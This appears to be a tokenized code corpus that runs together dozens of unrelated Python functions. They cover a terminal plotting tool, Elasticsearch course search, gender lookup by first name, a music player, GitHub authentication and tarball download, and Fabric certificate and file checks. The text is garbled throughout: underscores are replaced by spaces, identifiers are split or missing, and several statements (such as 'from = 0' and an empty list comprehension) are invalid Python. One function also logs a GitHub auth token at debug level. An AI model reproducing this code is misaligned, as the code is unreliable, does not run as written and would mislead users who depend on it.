def consume line ( self , line ) : data = RE VALUE KEY . split ( line . strip ( ) , 1 ) if len ( data ) == 1 : return float ( data [ 0 ] ) , None else : return float ( data [ 0 ] ) , data [ 1 ] . strip ( )
def update ( self , points , values = None ) : self . values = values or [ None ] * len ( points ) if np is None : if self . option . function : warnings . warn ( 'numpy not available, function ignored' ) self . points = points self . minimum = min ( self . points ) self . maximum = max ( self . points ) self . current = self . points [ - 1 ] else : self . points = self . apply function ( points ) self . minimum = np . min ( self . points ) self . maximum = np . max ( self . points ) self . current = self . points [ - 1 ] if self . maximum == self . minimum : self . extents = 1 else : self . extents = ( self . maximum - self . minimum ) self . extents = ( self . maximum - self . minimum )
def color ramp ( self , size ) : color = PALETTE . get ( self . option . palette , { } ) color = color . get ( self . term . colors , None ) color ramp = [ ] if color is not None : ratio = len ( color ) / float ( size ) for i in range ( int ( size ) ) : color ramp . append ( self . term . color ( color [ int ( ratio * i ) ] ) ) return color ramp
def human ( self , size , base = 1000 , units = ' k MGTZ' ) : sign = '+' if size >= 0 else '-' size = abs ( size ) if size < 1000 : return '%s%d' % ( sign , size ) for i , suffix in enumerate ( units ) : unit = 1000 ** ( i + 1 ) if size < unit : return ( '%s%.01f%s' % ( sign , size / float ( unit ) * base , suffix , ) ) . strip ( ) raise Overflow Error
def apply function ( self , points ) : if not self . option . function : return points if np is None : raise Import Error ( 'numpy is not available' ) if ':' in self . option . function : function , arguments = self . option . function . split ( ':' , 1 ) arguments = arguments . split ( ',' ) else : function = self . option . function arguments = [ ] # Resolve arguments arguments = list ( map ( self . function argument , arguments ) ) # Resolve function filter function = FUNCTION . get ( function ) if filter function is None : raise Type Error ( 'Invalid function "%s"' % ( function , ) ) else : # We wrap in ``list()`` to consume generators and iterators, as # ``np.array`` doesn't do this for us. return filter function ( np . array ( list ( points ) ) , * arguments )
def line ( self , p1 , p2 , resolution = 1 ) : xdiff = max ( p1 . x , p2 . x ) - min ( p1 . x , p2 . x ) ydiff = max ( p1 . y , p2 . y ) - min ( p1 . y , p2 . y ) xdir = [ - 1 , 1 ] [ int ( p1 . x <= p2 . x ) ] ydir = [ - 1 , 1 ] [ int ( p1 . y <= p2 . y ) ] r = int ( round ( max ( xdiff , ydiff ) ) ) if r == 0 : return for i in range ( ( r + 1 ) * resolution ) : x = p1 . x y = p1 . y if xdiff : x += ( float ( i ) * xdiff ) / r * xdir / resolution if ydiff : y += ( float ( i ) * ydiff ) / r * ydir / resolution yield Point ( ( x , y ) )
def set text ( self , point , text ) : if not self . option . legend : return if not isinstance ( point , Point ) : point = Point ( point ) for offset , char in enumerate ( str ( text ) ) : self . screen . canvas [ point . y ] [ point . x + offset ] = char
def render ( self , stream ) : encoding = self . option . encoding or self . term . encoding or "utf8" if self . option . color : ramp = self . color ramp ( self . size . y ) [ : : - 1 ] else : ramp = None if self . cycle >= 1 and self . lines : stream . write ( self . term . csi ( 'cuu' , self . lines ) ) zero = int ( self . null / 4 ) # Zero crossing lines = 0 for y in range ( self . screen . size . y ) : if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'smul' ) ) if ramp : stream . write ( ramp [ y ] ) for x in range ( self . screen . size . x ) : point = Point ( ( x , y ) ) if point in self . screen : value = self . screen [ point ] if isinstance ( value , int ) : stream . write ( chr ( self . base + value ) . encode ( encoding ) ) else : stream . write ( self . term . csi ( 'sgr0' ) ) stream . write ( self . term . csi wrap ( value . encode ( encoding ) , 'bold' ) ) if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'smul' ) ) if ramp : stream . write ( ramp [ y ] ) else : stream . write ( b' ' ) if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'rmul' ) ) if ramp : stream . write ( self . term . csi ( 'sgr0' ) ) stream . write ( b'\n' ) lines += 1 stream . flush ( ) self . cycle = self . cycle + 1 self . lines = lines
def normalised numpy ( self ) : dx = ( self . screen . width / float ( len ( self . points ) ) ) oy = ( self . screen . height ) points = np . array ( self . points ) - self . minimum points = points * 4.0 / self . extents * self . size . y for x , y in enumerate ( points ) : yield Point ( ( dx * x , min ( oy , oy - y ) , ) )
def normalised python ( self ) : dx = ( self . screen . width / float ( len ( self . points ) ) ) oy = ( self . screen . height ) for x , point in enumerate ( self . points ) : y = ( point - self . minimum ) * 4.0 / self . extents * self . size . y yield Point ( ( dx * x , min ( oy , oy - y ) , ) )
def null ( self ) : if not self . option . axis : return - 1 else : return self . screen . height - ( - self . minimum * 4.0 / self . extents * self . size . y )
def mem size ( self ) : data len = self . data mem size node count = len ( list ( self . xml doc . iter ( tag = etree . Element ) ) ) if self . compressed : size = 52 * node count + data len + 630 else : tags len = 0 for e in self . xml doc . iter ( tag = etree . Element ) : e len = max ( len ( e . tag ) , 8 ) e len = ( e len + 3 ) & ~ 3 tags len += e len size = 56 * node count + data len + 630 + tags len # debugging #print('nodes:{} ({}) data:{} ({})'.format(node count,hex(node count), data len, hex(data len))) return ( size + 8 ) & ~ 7
def load class ( class path , default ) : if class path is None : return default component = class path . rsplit ( '.' , 1 ) result processor = getattr ( importlib . import module ( component [ 0 ] ) , component [ 1 ] , default ) if len ( component ) > 1 else default return result processor
def process pagination values ( request ) : size = 20 page = 0 from = 0 if "page size" in request . POST : size = int ( request . POST [ "page size" ] ) max page size = getattr ( settings , "SEARCH MAX PAGE SIZE" , 100 ) # The parens below are superfluous, but make it much clearer to the reader what is going on if not ( 0 < size <= max page size ) : # pylint: disable=superfluous-parens raise Value Error ( ( 'Invalid page size of {page size}' ) . format ( page size = size ) ) if "page index" in request . POST : page = int ( request . POST [ "page index" ] ) from = page * size return size , from , page
def process field values ( request ) : return { field key : request . POST [ field key ] for field key in request . POST if field key in course discovery filter fields ( ) }
def translate hits ( es response ) : def translate result ( result ) : """ Any conversion from ES result syntax into our search engine syntax """ translated result = copy . copy ( result ) data = translated result . pop ( " source" ) translated result . update ( { "data" : data , "score" : translated result [ " score" ] } ) return translated result def translate facet ( result ) : """ Any conversion from ES facet syntax into our search engine sytax """ terms = { term [ "term" ] : term [ "count" ] for term in result [ "terms" ] } return { "terms" : terms , "total" : result [ "total" ] , "other" : result [ "other" ] , } results = [ translate result ( hit ) for hit in es response [ "hits" ] [ "hits" ] ] response = { "took" : es response [ "took" ] , "total" : es response [ "hits" ] [ "total" ] , "max score" : es response [ "hits" ] [ "max score" ] , "results" : results , } if "facets" in es response : response [ "facets" ] = { facet : translate facet ( es response [ "facets" ] [ facet ] ) for facet in es response [ "facets" ] } return response
def get filter field ( field name , field value ) : filter field = None if isinstance ( field value , Value Range ) : range values = { } if field value . lower : range values . update ( { "gte" : field value . lower string } ) if field value . upper : range values . update ( { "lte" : field value . upper string } ) filter field = { "range" : { field name : range values } } elif is iterable ( field value ) : filter field = { "terms" : { field name : field value } } else : filter field = { "term" : { field name : field value } } return filter field
def process facet terms ( facet terms ) : elastic facets = { } for facet in facet terms : facet term = { "field" : facet } if facet terms [ facet ] : for facet option in facet terms [ facet ] : facet term [ facet option ] = facet terms [ facet ] [ facet option ] elastic facets [ facet ] = { "terms" : facet term } return elastic facets
def get mappings ( cls , index name , doc type ) : return cache . get ( cls . get cache item name ( index name , doc type ) , { } )
def set mappings ( cls , index name , doc type , mappings ) : cache . set ( cls . get cache item name ( index name , doc type ) , mappings )
def log indexing error ( cls , indexing errors ) : indexing errors log = [ ] for indexing error in indexing errors : indexing errors log . append ( str ( indexing error ) ) raise exceptions . Elasticsearch Exception ( ', ' . join ( indexing errors log ) )
def remove ( self , doc type , doc ids , * * kwargs ) : try : # ignore is flagged as an unexpected-keyword-arg; ES python client documents that it can be used # pylint: disable=unexpected-keyword-arg actions = [ ] for doc id in doc ids : log . debug ( "Removing document of type %s and index %s" , doc type , doc id ) action = { ' op type' : 'delete' , " index" : self . index name , " type" : doc type , " id" : doc id } actions . append ( action ) bulk ( self . es , actions , * * kwargs ) except Bulk Index Error as ex : valid errors = [ error for error in ex . errors if error [ 'delete' ] [ 'status' ] != 404 ] if valid errors : log . exception ( "An error occurred while removing documents from the index." ) raise
def perform search ( search term , user = None , size = 10 , from = 0 , course id = None ) : # field , filter  and exclude dictionary(s) can be overridden by calling application # field dictionary includes course if course id provided ( field dictionary , filter dictionary , exclude dictionary ) = Search Filter Generator . generate field filters ( user = user , course id = course id ) searcher = Search Engine . get search engine ( getattr ( settings , "COURSEWARE INDEX NAME" , "courseware index" ) ) if not searcher : raise No Search Engine Error ( "No search engine specified in settings.SEARCH ENGINE" ) results = searcher . search string ( search term , field dictionary = field dictionary , filter dictionary = filter dictionary , exclude dictionary = exclude dictionary , size = size , from = from , doc type = "courseware content" , ) # post-process the result for result in results [ "results" ] : result [ "data" ] = Search Result Processor . process result ( result [ "data" ] , search term , user ) results [ "access denied count" ] = len ( [ r for r in results [ "results" ] if r [ "data" ] is None ] ) results [ "results" ] = [ r for r in results [ "results" ] if r [ "data" ] is not None ] return results
def course discovery search ( search term = None , size = 20 , from = 0 , field dictionary = None ) : # We'll ignore the course-enrollemnt informaiton in field and filter # dictionary, and use our own logic upon enrollment dates for these use search fields = [ "org" ] ( search fields , , exclude dictionary ) = Search Filter Generator . generate field filters ( ) use field dictionary = { } use field dictionary . update ( { field : search fields [ field ] for field in search fields if field in use search fields } ) if field dictionary : use field dictionary . update ( field dictionary ) if not getattr ( settings , "SEARCH SKIP ENROLLMENT START DATE FILTERING" , False ) : use field dictionary [ "enrollment start" ] = Date Range ( None , datetime . utcnow ( ) ) searcher = Search Engine . get search engine ( getattr ( settings , "COURSEWARE INDEX NAME" , "courseware index" ) ) if not searcher : raise No Search Engine Error ( "No search engine specified in settings.SEARCH ENGINE" ) results = searcher . search ( query string = search term , doc type = "course info" , size = size , from = from , # only show when enrollment start IS provided and is before now field dictionary = use field dictionary , # show if no enrollment end is provided and has not yet been reached filter dictionary = { "enrollment end" : Date Range ( datetime . utcnow ( ) , None ) } , exclude dictionary = exclude dictionary , facet terms = course discovery facets ( ) , ) return results
def strings in dictionary ( dictionary ) : strings = [ value for value in six . itervalues ( dictionary ) if not isinstance ( value , dict ) ] for child dict in [ dv for dv in six . itervalues ( dictionary ) if isinstance ( dv , dict ) ] : strings . extend ( Search Result Processor . strings in dictionary ( child dict ) ) return strings
def find matches ( strings , words , length hoped ) : lower words = [ w . lower ( ) for w in words ] def has match ( string ) : """ Do any of the words match within the string """ lower string = string . lower ( ) for test word in lower words : if test word in lower string : return True return False shortened strings = [ textwrap . wrap ( s ) for s in strings ] short string list = list ( chain . from iterable ( shortened strings ) ) matches = [ ms for ms in short string list if has match ( ms ) ] cumulative len = 0 break at = None for idx , match in enumerate ( matches ) : cumulative len += len ( match ) if cumulative len >= length hoped : break at = idx break return matches [ 0 : break at ]
def decorate matches ( match in , match word ) : matches = re . finditer ( match word , match in , re . IGNORECASE ) for matched string in set ( [ match . group ( ) for match in matches ] ) : match in = match in . replace ( matched string , getattr ( settings , "SEARCH MATCH DECORATION" , u"<b>{}</b>" ) . format ( matched string ) ) return match in
def excerpt ( self ) : if "content" not in self . results fields : return None match phrases = [ self . match phrase ] if six . PY2 : separate phrases = [ phrase . decode ( 'utf-8' ) for phrase in shlex . split ( self . match phrase . encode ( 'utf-8' ) ) ] else : separate phrases = [ phrase for phrase in shlex . split ( self . match phrase ) ] if len ( separate phrases ) > 1 : match phrases . extend ( separate phrases ) else : match phrases = separate phrases matches = Search Result Processor . find matches ( Search Result Processor . strings in dictionary ( self . results fields [ "content" ] ) , match phrases , DESIRED EXCERPT LENGTH ) excerpt text = ELLIPSIS . join ( matches ) for match word in match phrases : excerpt text = Search Result Processor . decorate matches ( excerpt text , match word ) return excerpt text
def parse ( self , filename ) : self . names = { } with codecs . open ( filename , encoding = "iso8859-1" ) as f : for line in f : if any ( map ( lambda c : 128 < ord ( c ) < 160 , line ) ) : line = line . encode ( "iso8859-1" ) . decode ( "windows-1252" ) self . eat name line ( line . strip ( ) )
def eat name line ( self , line ) : if line [ 0 ] not in "#=" : parts = line . split ( ) country values = line [ 30 : - 1 ] name = map name ( parts [ 1 ] ) if not self . case sensitive : name = name . lower ( ) if parts [ 0 ] == "M" : self . set ( name , u"male" , country values ) elif parts [ 0 ] == "1M" or parts [ 0 ] == "?M" : self . set ( name , u"mostly male" , country values ) elif parts [ 0 ] == "F" : self . set ( name , u"female" , country values ) elif parts [ 0 ] == "1F" or parts [ 0 ] == "?F" : self . set ( name , u"mostly female" , country values ) elif parts [ 0 ] == "?" : self . set ( name , self . unknown value , country values ) else : raise "Not sure what to do with a sex of %s" % parts [ 0 ]
def set ( self , name , gender , country values ) : if '+' in name : for replacement in [ '' , ' ' , '-' ] : self . set ( name . replace ( '+' , replacement ) , gender , country values ) else : if name not in self . names : self . names [ name ] = { } self . names [ name ] [ gender ] = country values
def most popular gender ( self , name , counter ) : if name not in self . names : return self . unknown value max count , max tie = ( 0 , 0 ) best = self . names [ name ] . keys ( ) [ 0 ] for gender , country values in self . names [ name ] . items ( ) : count , tie = counter ( country values ) if count > max count or ( count == max count and tie > max tie ) : max count , max tie , best = count , tie , gender return best if max count > 0 else self . unknown value
def get gender ( self , name , country = None ) : if not self . case sensitive : name = name . lower ( ) if name not in self . names : return self . unknown value elif not country : def counter ( country values ) : country values = map ( ord , country values . replace ( " " , "" ) ) return ( len ( country values ) , sum ( map ( lambda c : c > 64 and c - 55 or c - 48 , country values ) ) ) return self . most popular gender ( name , counter ) elif country in self . class . COUNTRIES : index = self . class . COUNTRIES . index ( country ) counter = lambda e : ( ord ( e [ index ] ) - 32 , 0 ) return self . most popular gender ( name , counter ) else : raise No Country Error ( "No such country: %s" % country )
def is connected ( self ) : # need to wrap in try/except b/c of wc3270's socket connection dynamics try : # this is basically a no-op, but it results in the the current status # getting updated self . exec command ( b"Query(Connection State)" ) # connected status is like 'C(192.168.1.1)', disconnected is 'N' return self . status . connection state . startswith ( b"C(" ) except Not Connected Exception : return False
def connect ( self , host ) : if not self . app . connect ( host ) : command = "Connect({0})" . format ( host ) . encode ( "ascii" ) self . exec command ( command ) self . last host = host
def signature matches ( func , args = ( ) , kwargs = { } ) : try : sig = inspect . signature ( func ) sig . bind ( * args , * * kwargs ) except Type Error : return False else : return True
def register chooser ( self , chooser , * * kwargs ) : if not issubclass ( chooser , Chooser ) : return self . register simple chooser ( chooser , * * kwargs ) self . choosers [ chooser . model ] = chooser ( * * kwargs ) return chooser
def from json list ( cls , api client , data ) : return [ cls . from json ( api client , item ) for item in data ]
def from json ( cls , api client , data ) : self = cls ( api client ) Pandora Model . populate fields ( api client , self , data ) return self
def base repr ( self , and also = None ) : items = [ "=" . join ( ( key , repr ( getattr ( self , key ) ) ) ) for key in sorted ( self . fields . keys ( ) ) ] if items : output = ", " . join ( items ) else : output = None if and also : return "{}({}, {})" . format ( self . class . name , output , and also ) else : return "{}({})" . format ( self . class . name , output )
def send cmd ( self , cmd ) : self . process . stdin . write ( "{}\n" . format ( cmd ) . encode ( "utf-8" ) ) self . process . stdin . flush ( )
def ensure started ( self ) : if self . process and self . process . poll ( ) is None : return if not getattr ( self , " cmd" ) : raise Runtime Error ( "Player command is not configured" ) log . debug ( "Starting playback command: %r" , self . cmd ) self . process = Silent Popen ( self . cmd ) self . post start ( )
def station selection menu ( self , error = None ) : self . screen . clear ( ) if error : self . screen . print error ( "{}\n" . format ( error ) ) for i , station in enumerate ( self . stations ) : i = "{:>3}" . format ( i ) print ( "{}: {}" . format ( Colors . yellow ( i ) , station . name ) ) return self . stations [ self . screen . get integer ( "Station: " ) ]
def input ( self , input , song ) : try : cmd = getattr ( self , self . CMD MAP [ input ] [ 1 ] ) except ( Index Error , Key Error ) : return self . screen . print error ( "Invalid command {!r}!" . format ( input ) ) cmd ( song )
def poll ( self ) : ret = self . communication Channel . receive finished ( ) self . nruns -= len ( ret ) return ret
def end ( self ) : results = self . communication Channel . receive ( ) if self . nruns != len ( results ) : import logging logger = logging . get Logger ( name ) # logger.set Level(logging.DEBUG) logger . warning ( 'too few results received: {} results received, {} expected' . format ( len ( results ) , self . nruns ) ) return results
def expand str ( path cfg , alias dict , overriding kargs ) : if path cfg in alias dict : # e.g., path cfg = 'var cut' return expand str alias ( path cfg , alias dict , overriding kargs ) # e.g., path cfg = 'ev : {low} <= ev.var[0] < {high}' return expand for lambda str ( path cfg , alias dict , overriding kargs )
def expand tuple ( path cfg , alias dict , overriding kargs ) : # e.g., # path cfg = ('ev : {low} <= ev.var[0] < {high}', {'low': 10, 'high': 200}) # overriding kargs = {'alias': 'var cut', 'name': 'var cut25', 'low': 25} new path cfg = path cfg [ 0 ] # e.g., 'ev : {low} <= ev.var[0] < {high}' new overriding kargs = path cfg [ 1 ] . copy ( ) # e.g., {'low': 10, 'high': 200} new overriding kargs . update ( overriding kargs ) # e.g., {'low': 25, 'high': 200, 'alias': 'var cut', 'name': 'var cut25'} return expand path cfg ( new path cfg , overriding kargs = new overriding kargs , alias dict = alias dict )
def wait ( self ) : finished pids = [ ] while self . running procs : finished pids . extend ( self . poll ( ) ) return finished pids
def get Vector ( self , tree , branch Name ) : if ( tree , branch Name ) in self . class . address Dict : return self . class . address Dict [ ( tree , branch Name ) ] its Vector = self . get Vector ( tree , branch Name ) self . class . address Dict [ ( tree , branch Name ) ] = its Vector return its Vector
def handle Auth ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : # if yotta is being run noninteractively, then we never retry, but we # do call auth.authorize User, so that a login URL can be displayed: interactive = globalconf . get ( 'interactive' ) def retry With Auth Or Raise ( original exception ) : # in all cases ask for auth, so that in non-interactive mode a # login URL is displayed auth . authorize User ( provider = 'github' , interactive = interactive ) if not interactive : raise original exception else : logger . debug ( 'trying with authtoken: %s' , settings . get Property ( 'github' , 'authtoken' ) ) return fn ( * args , * * kwargs ) # authorised requests have a higher rate limit, but display a warning # message in this case, as the user might not expect the requirement to # auth: def handle Rate Limit Exceeded ( original exception ) : if not user Authed With Github ( ) : logger . warning ( 'github rate limit for anonymous requests exceeded: you must log in' ) return retry With Auth Or Raise ( original exception ) else : raise original exception try : return fn ( * args , * * kwargs ) except requests . exceptions . HTTP Error as e : if e . response . status code == 403 : # 403 = rate limit exceeded return handle Rate Limit Exceeded ( e ) if e . response . status code == 401 : # 401 = unauthorised return retry With Auth Or Raise ( e ) raise except github . Bad Credentials Exception as e : logger . debug ( "github: bad credentials" ) return retry With Auth Or Raise ( e ) except github . Unknown Object Exception as e : logger . debug ( "github: unknown object" ) # some endpoints return 404 if the user doesn't have access, maybe # it would be better to prompt for another username and password, # and store multiple tokens that we can try for each request.... # but for now we assume that if the user is logged in then a 404 # really is a 404 if not user Authed With Github ( ) : logger . info ( 'failed to fetch Github object, re-trying with authentication...' ) return retry With Auth Or Raise ( e ) raise except github . Rate Limit Exceeded Exception as e : return handle Rate Limit Exceeded ( e ) except github . Github Exception as e : if e . status == 403 : # 403 = rate limit exceeded return handle Rate Limit Exceeded ( e ) raise return wrapped
def get Tip Archive URL ( repo ) : g = Github ( settings . get Property ( 'github' , 'authtoken' ) ) repo = g . get repo ( repo ) return repo . get archive link ( 'tarball' )
def get Commit Archive URL ( repo , commit ) : g = Github ( settings . get Property ( 'github' , 'authtoken' ) ) repo = g . get repo ( repo ) return repo . get archive link ( 'tarball' , commit )
def get Tarball ( url , into directory , cache key , origin info = None ) : try : access common . unpack From Cache ( cache key , into directory ) except Key Error as e : tok = settings . get Property ( 'github' , 'authtoken' ) headers = { } if tok is not None : headers [ 'Authorization' ] = 'token ' + str ( tok ) logger . debug ( 'GET %s' , url ) response = requests . get ( url , allow redirects = True , stream = True , headers = headers ) response . raise for status ( ) logger . debug ( 'getting file: %s' , url ) logger . debug ( 'headers: %s' , response . headers ) response . raise for status ( ) # github doesn't exposes hashes of the archives being downloaded as far # as I can tell :( access common . unpack Tarball Stream ( stream = response , into directory = into directory , hash = { } , cache key = cache key , origin info = origin info )
def available Versions ( self ) : r = [ ] for t in self . get Tags ( ) : logger . debug ( "available version tag: %s" , t ) # ignore empty tags: if not len ( t [ 0 ] . strip ( ) ) : continue try : r . append ( Github Component Version ( t [ 0 ] , t [ 0 ] , url = t [ 1 ] , name = self . name , cache key = None ) ) except Value Error : logger . debug ( 'invalid version tag: %s' , t ) return r
def available Tags ( self ) : return [ Github Component Version ( '' , t [ 0 ] , t [ 1 ] , self . name , cache key = create Cache Key ( 'tag' , t [ 0 ] , t [ 1 ] , self . name ) ) for t in self . get Tags ( ) ]
def available Branches ( self ) : return [ Github Component Version ( '' , b [ 0 ] , b [ 1 ] , self . name , cache key = None ) for b in get Branch Heads ( self . repo ) . items ( ) ]
def commit Version ( self ) : import re commit match = re . match ( '^[a-f0-9]{7,40}$' , self . tag Or Branch Spec ( ) , re . I ) if commit match : return Github Component Version ( '' , '' , get Commit Archive URL ( self . repo , self . tag Or Branch Spec ( ) ) , self . name , cache key = None ) return None
def handle Auth ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : # auth, , authenticate users, internal from yotta . lib import auth # if yotta is being run noninteractively, then we never retry, but we # do call auth.authorize User, so that a login URL can be displayed: interactive = globalconf . get ( 'interactive' ) try : return fn ( * args , * * kwargs ) except requests . exceptions . HTTP Error as e : if e . response . status code == requests . codes . unauthorized : #pylint: disable=no-member logger . debug ( '%s unauthorised' , fn ) # any provider is sufficient for registry auth auth . authorize User ( provider = None , interactive = interactive ) if interactive : logger . debug ( 'retrying after authentication...' ) return fn ( * args , * * kwargs ) raise return wrapped
def islast ( generator ) : next x = None first = True for x in generator : if not first : yield ( next x , False ) next x = x first = False if not first : yield ( next x , True )
def source Dir Validation Error ( dirname , component name ) : if dirname == component name : return 'Module %s public include directory %s should not contain source files' % ( component name , dirname ) elif dirname . lower ( ) in ( 'source' , 'src' ) and dirname != 'source' : return 'Module %s has non-standard source directory name: "%s" should be "source"' % ( component name , dirname ) elif is Potential Test Dir ( dirname ) and dirname != 'test' : return 'Module %s has non-standard test directory name: "%s" should be "test"' % ( component name , dirname ) elif not Source Dir Regex . match ( dirname ) : corrected = Source Dir Invalid Regex . sub ( '' , dirname . lower ( ) ) if not corrected : corrected = 'source' return 'Module %s has non-standard source directory name: "%s" should be "%s"' % ( component name , dirname , corrected ) else : return None
def commit Version ( self , spec ) : import re commit match = re . match ( '^[a-f0-9]{7,40}$' , spec , re . I ) if commit match : return Git Clone Version ( '' , spec , self ) return None
def load Config ( self ) : config dicts = [ self . additional config , self . app config ] + [ t . get Config ( ) for t in self . hierarchy ] # create an identical set of dictionaries, but with the names of the # sources in place of the values. When these are merged they will show # where each merged property came from: config blame = [ mirror Structure ( self . additional config , 'command-line config' ) , mirror Structure ( self . app config , 'application\'s config.json' ) , ] + [ mirror Structure ( t . get Config ( ) , t . get Name ( ) ) for t in self . hierarchy ] self . config = merge Dictionaries ( * config dicts ) self . config blame = merge Dictionaries ( * config blame )
def sometimes Prune Cache ( p ) : def decorator ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : r = fn ( * args , * * kwargs ) if random . random ( ) < p : prune Cache ( ) return r return wrapped return decorator
def get expiration date ( self , fn ) : r = self . local renderer r . env . crt fn = fn with hide ( 'running' ) : ret = r . local ( 'openssl x509 -noout -in {ssl crt fn} -dates' , capture = True ) matches = re . findall ( 'not After=(.*?)$' , ret , flags = re . IGNORECASE ) if matches : return dateutil . parser . parse ( matches [ 0 ] )
def list expiration dates ( self , base = 'roles/all/ssl' ) : max fn len = 0 max date len = 0 data = [ ] for fn in os . listdir ( base ) : fqfn = os . path . join ( base , fn ) if not os . path . isfile ( fqfn ) : continue if not fn . endswith ( '.crt' ) : continue expiration date = self . get expiration date ( fqfn ) max fn len = max ( max fn len , len ( fn ) ) max date len = max ( max date len , len ( str ( expiration date ) ) ) data . append ( ( fn , expiration date ) ) print ( '%s %s %s' % ( 'Filename' . ljust ( max fn len ) , 'Expiration Date' . ljust ( max date len ) , 'Expired' ) ) now = datetime . now ( ) . replace ( tzinfo = pytz . UTC ) for fn , dt in sorted ( data ) : if dt is None : expired = '?' elif dt < now : expired = 'YES' else : expired = 'NO' print ( '%s %s %s' % ( fn . ljust ( max fn len ) , str ( dt ) . ljust ( max date len ) , expired ) )
def verify certificate chain ( self , base = None , crt = None , csr = None , key = None ) : from burlap . common import get verbose , print fail , print success r = self . local renderer if base : crt = base + '.crt' csr = base + '.csr' key = base + '.key' else : assert crt and csr and key , 'If base not provided, crt and csr and key must be given.' assert os . path . isfile ( crt ) assert os . path . isfile ( csr ) assert os . path . isfile ( key ) csr md5 = r . local ( 'openssl req -noout -modulus -in %s | openssl md5' % csr , capture = True ) key md5 = r . local ( 'openssl rsa -noout -modulus -in %s | openssl md5' % key , capture = True ) crt md5 = r . local ( 'openssl x509 -noout -modulus -in %s | openssl md5' % crt , capture = True ) match = crt md5 == csr md5 == key md5 if self . verbose or not match : print ( 'crt:' , crt md5 ) print ( 'csr:' , csr md5 ) print ( 'key:' , key md5 ) if match : print success ( 'Files look good!' ) else : print fail ( 'Files no not match!' ) raise Exception ( 'Files no not match!' )
def get environ handler ( name , d ) : def func ( site = None , * * kwargs ) : from fabric import state # We can't auto-set default site, because that break tasks that have # to operate over multiple sites. # If a task requires a site, it can pull from default site as needed. #site = site or d.get('default site') or env.SITE BURLAP SHELL PREFIX = int ( os . environ . get ( 'BURLAP SHELL PREFIX' , '0' ) ) if BURLAP SHELL PREFIX : print ( '#!/bin/bash' ) print ( '# Generated with:' ) print ( '#' ) print ( '#     export BURLAP SHELL PREFIX=1; export BURLAP COMMAND PREFIX=0; fab %s' % ( ' ' . join ( sys . argv [ 1 : ] ) , ) ) print ( '#' ) BURLAP COMMAND PREFIX = int ( os . environ . get ( 'BURLAP COMMAND PREFIX' , '1' ) ) with args = [ ] if not BURLAP COMMAND PREFIX : for k in state . output : state . output [ k ] = False hostname = kwargs . get ( 'hostname' ) hostname = hostname or kwargs . get ( 'name' ) hostname = hostname or kwargs . get ( 'hn' ) hostname = hostname or kwargs . get ( 'h' ) verbose = int ( kwargs . get ( 'verbose' , '0' ) ) common . set verbose ( verbose ) # Load environment for current role. env . update ( env default ) env [ common . ROLE ] = os . environ [ common . ROLE ] = name if site : env [ common . SITE ] = os . environ [ common . SITE ] = site env . update ( d ) # Load host retriever. retriever = None if env . hosts retriever : # Dynamically retrieve hosts. #             module name = '.'.join(env.hosts retriever.split('.')[:-1]) #             func name = env.hosts retriever.split('.')[-1] #             retriever = getattr(importlib.import module(module name), func name) retriever = common . get hosts retriever ( ) if verbose : print ( 'Using retriever:' , env . hosts retriever , retriever ) # Load host translator. translator = None if hostname : # Filter hosts list by a specific host name. module name = '.' . join ( env . hostname translator . split ( '.' ) [ : - 1 ] ) func name = env . hostname translator . split ( '.' ) [ - 1 ] translator = getattr ( importlib . import module ( module name ) , func name ) # Re-load environment for current role, incase loading # the retriever/translator reset some environment values. env . update ( env default ) env [ common . ROLE ] = os . environ [ common . ROLE ] = name if site : env [ common . SITE ] = os . environ [ common . SITE ] = site env . update ( d ) # Dynamically retrieve hosts. if env . hosts retriever : if verbose : print ( 'Building host list with retriever %s...' % env . hosts retriever ) env . hosts = list ( retriever ( site = site ) ) if verbose : print ( 'Found hosts:' ) print ( env . hosts ) # Filter hosts list by a specific host name. if hostname : hostname = hostname hostname = translator ( hostname = hostname ) hosts = env . hosts env . hosts = [ for in env . hosts if == hostname ] assert env . hosts , 'Hostname %s does not match any known hosts.' % ( hostname , ) if env . is local is None : if env . hosts : env . is local = 'localhost' in env . hosts or '127.0.0.1' in env . hosts elif env . host string : env . is local = 'localhost' in env . host string or '127.0.0.1' in env . host string for cb in common . post role load callbacks : cb ( ) # Ensure satchels don't cache values from previously loaded roles. common . reset all satchels ( ) if env . hosts and not env . host string : env . host string = env . hosts [ 0 ] if verbose : print ( 'Loaded role %s.' % ( name , ) , file = sys . stderr ) func . doc = 'Sets enivronment variables for the "%s" role.' % ( name , ) return func
def is file ( self , path , use sudo = False ) : if self . is local and not use sudo : return os . path . isfile ( path ) else : func = use sudo and sudo or run with self . settings ( hide ( 'running' , 'warnings' ) , warn only = True ) : return func ( '[ -f "%(path)s" ]' % locals ( ) ) . succeeded
def is dir ( self , path , use sudo = False ) : if self . is local and not use sudo : return os . path . isdir ( path ) else : func = use sudo and sudo or run with self . settings ( hide ( 'running' , 'warnings' ) , warn only = True ) : return func ( '[ -d "%(path)s" ]' % locals ( ) ) . succeeded
def is link ( self , path , use sudo = False ) : func = use sudo and sudo or run with self . settings ( hide ( 'running' , 'warnings' ) , warn only = True ) : return func ( '[ -L "%(path)s" ]' % locals ( ) ) . succeeded
def get owner ( self , path , use sudo = False ) : func = use sudo and run as root or self . run # I'd prefer to use quiet=True, but that's not supported with older # versions of Fabric. with self . settings ( hide ( 'running' , 'stdout' ) , warn only = True ) : result = func ( 'stat -c %%U "%(path)s"' % locals ( ) ) if result . failed and 'stat: illegal option' in result : # Try the BSD version of stat return func ( 'stat -f %%Su "%(path)s"' % locals ( ) ) return result
